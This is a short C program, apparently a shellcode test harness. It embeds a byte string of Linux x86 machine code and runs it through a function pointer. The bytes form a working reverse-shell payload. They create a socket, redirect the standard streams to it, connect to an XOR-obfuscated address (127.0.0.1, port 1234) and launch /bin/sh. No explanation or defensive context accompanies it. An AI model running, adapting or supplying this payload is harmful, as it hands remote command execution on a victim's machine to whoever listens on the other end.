#include<stdio.h>
#include<string.h>

unsigned char code[] = \

"\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xf6\x56\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x31\xff\x97\x89\xfb\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x31\xdb\xb8\x80\xff\xff\xfe\x83\xf0\xff\x50\x66\x68\x04\xd2\x66\x6a\x02\x89\xe1\x6a\x10\x51\x57\x89\xe1\xb2\x10\x31\xc0\xb0\x66\x31\xdb\xb3\x03\xcd\x80\x31\xc0\xb0\x0b\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	